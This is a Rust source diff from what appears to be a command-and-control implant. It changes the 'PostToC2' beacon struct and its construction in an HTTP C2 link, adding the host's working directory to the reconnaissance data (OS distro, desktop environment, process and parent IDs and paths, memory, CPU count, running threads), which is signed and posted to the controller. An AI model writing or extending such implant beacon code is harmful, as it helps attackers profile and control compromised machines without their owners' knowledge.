@@ -22,6 +22,8 @@ use crate::link_util::get_domain_name;
 //use std::path::Path;
 use crate::link_util::process_path;
 use crate::link_util::process_name_and_parent;
+use crate::link_util::bytes_to_gigabytes_string;
+use crate::link_util::working_dir;
 
 //use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
 use sysinfo::System;
@@ -432,16 +434,16 @@ pub struct PostToC2 {
     pub distro: String,
     pub desktop_env: String,
 
+    pub working_dir: String,
     pub process_path: String,
     pub process_name: String,
     pub pid: u32,
     pub parent_name:String,
     pub ppid: u32,
 
-    pub total_memory: u64,
-    pub used_memory: u64,
+    pub total_memory: String,
+    pub used_memory: String,
     pub nb_cpu: usize,
-
 
     pub data_operation: Vec<DataOperation>,
     pub running_thread: Vec<String>,
@@ -488,26 +490,20 @@ impl LinkFetch for HTTPPostC2Link {
             distro: whoami::distro(),
             desktop_env: whoami::desktop_env().to_string(),
             pid: process::id(),
-            ppid: parent_id(),
-
-            
+            ppid: parent_id(),          
             process_name : process_name,
             process_path: process_path,
+            working_dir : working_dir(),
             parent_name:parent_name,
-        
-            total_memory: sys.total_memory(),
-            used_memory: sys.used_memory(),
+            total_memory: bytes_to_gigabytes_string(sys.total_memory()),
+            used_memory: bytes_to_gigabytes_string(sys.used_memory()),
             nb_cpu: sys.cpus().len(),      
-
             data_operation: self.dataoperation.clone(),
             running_thread: running_thread_string.clone(),
             peer_public_key_bytes: peer_public_key_bytes.clone(),
             sign_bytes: vec![],
         };
 
-        //TODO remove debug
-        //format!("{:?}",post_data);
-        //todo!();
 
         let sign_data = format!("{:?}", post_data);
         let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
